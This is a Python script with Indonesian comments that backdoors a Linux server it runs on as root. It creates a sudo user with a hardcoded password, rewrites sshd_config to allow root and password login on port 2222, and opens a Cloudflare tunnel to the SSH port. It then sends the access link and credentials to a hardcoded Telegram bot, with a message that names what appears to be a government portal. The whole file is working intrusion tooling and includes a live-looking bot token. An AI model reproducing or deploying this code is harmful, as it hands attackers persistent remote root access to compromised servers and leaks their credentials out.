import subprocess
import time
import re
import os
import shutil
import sys

# --- KONFIGURASI ---
TOKEN = "7520250109:AAGRiIauax-4mDUBp2CWjUqYgyrG2sncpjk"
CHAT_ID = "2029488529"
USER_SSH = "system-thc"
PASS_SSH = "cokaberul123"
SSH_PORT = "2222"
LOG_FILE = "/tmp/cloudflared.log"

def run_cmd(cmd):
    """Menjalankan perintah shell tanpa output ke terminal."""
    try:
        subprocess.run(cmd, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def setup_system():
    print("[-] Mengonfigurasi User dan SSH...")
    
    # 1. Update & Install dasar
    run_cmd("apt-get update")
    run_cmd("apt-get install -y sudo openssh-server wget coreutils")

    # 2. Buat User & Set Password
    # Menghapus user lama jika ada untuk reset bersih
    run_cmd(f"userdel -r {USER_SSH}") 
    run_cmd(f"useradd -m -s /bin/bash {USER_SSH}")
    run_cmd(f"echo '{USER_SSH}:{PASS_SSH}' | chpasswd")
    
    # 3. Masukkan ke grup sudo
    run_cmd(f"usermod -aG sudo {USER_SSH}")

    # 4. Konfigurasi SSH Port & Permit Login
    ssh_config = f"""
Port {SSH_PORT}
PasswordAuthentication yes
PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
"""
    with open("/etc/ssh/sshd_config", "w") as f:
        f.write(ssh_config)
    
    run_cmd("service ssh restart")
    run_cmd("systemctl restart ssh")

def check_dependencies():
    print("[-] Mengecek Cloudflared...")
    if not shutil.which("cloudflared"):
        dl_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        run_cmd(f"wget {dl_url} -O /usr/local/bin/cloudflared")
        run_cmd("chmod +x /usr/local/bin/cloudflared")

def start_tunnel():
    print(f"[-] Menghidupkan Tunnel di Port {SSH_PORT}...")
    run_cmd("pkill -9 cloudflared")
    
    if os.path.exists(LOG_FILE):
        try: os.remove(LOG_FILE)
        except: pass

    # Menjalankan cloudflared dengan nice -n 19 agar website utama tidak berat
    cmd = f"nice -n 19 cloudflared tunnel --url tcp://localhost:{SSH_PORT} > {LOG_FILE} 2>&1 &"
    subprocess.Popen(cmd, shell=True)

    time.sleep(15)

    full_url = None
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            log_content = f.read()
            match = re.search(r'https://[-a-zA-Z0-9.]*\.trycloudflare.com', log_content)
            if match:
                full_url = match.group(0)

    if full_url:
        send_telegram(full_url)
        print(f"[+] Berhasil! Link dikirim ke Telegram.")
    else:
        print("[!] Tunnel gagal mendapatkan link.")

def send_telegram(url):
    import urllib.request
    import urllib.parse
    clean_url = url.replace("https://", "")
    message = (
        "🔥 *MEGA SSH ACCESS READY* 🔥\n\n"
        "portalkc_dia_gov_cz\n"
        f"👤 *User:* `{USER_SSH}`\n"
        f"🔑 *Pass:* `{PASS_SSH}`\n"
        f"🌐 *Link:* `{url}`\n\n"
        "*Command SSH:* \n"
        f"```ssh -o ProxyCommand=\"cloudflared access tcp --hostname %h\" {USER_SSH}@{clean_url}```"
    )
    encoded_msg = urllib.parse.quote(message)
    api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={encoded_msg}&parse_mode=Markdown"
    try:
        urllib.request.urlopen(api_url, timeout=10)
    except:
        pass

if __name__ == "__main__":
    if os.getuid() != 0:
        print("Harus dijalankan sebagai root!")
        sys.exit(1)

    setup_system()
    check_dependencies()
    start_tunnel()
    sys.exit(0)
